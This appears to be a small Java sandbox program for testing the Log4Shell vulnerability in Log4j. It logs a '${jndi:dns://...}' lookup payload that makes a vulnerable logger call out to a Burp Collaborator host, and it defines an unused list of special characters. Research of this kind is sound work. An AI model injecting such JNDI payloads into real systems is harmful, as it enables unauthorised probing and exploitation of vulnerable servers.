package eu.righettod;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.Arrays;
import java.util.List;

public class SandboxJndi {
    public static void main(String[] args) throws Exception {
        Logger log = LogManager.getLogger(SandboxJndi.class);
        System.out.printf("LOG4J2 version: %s\n", log.getClass().getPackage().getImplementationVersion());
        System.out.printf("Java version  : %s\n", System.getProperty("java.version"));
        List<String> characters = Arrays.asList("-","_","$","%","#","&","(",")","{","\\}","+","=","/","\\","@","|","'");
        log.info("${jndi:dns://toto.9kux5e3gcsnh55bza0sahpwpzg56tv.burpcollaborator.net}");
    }
}
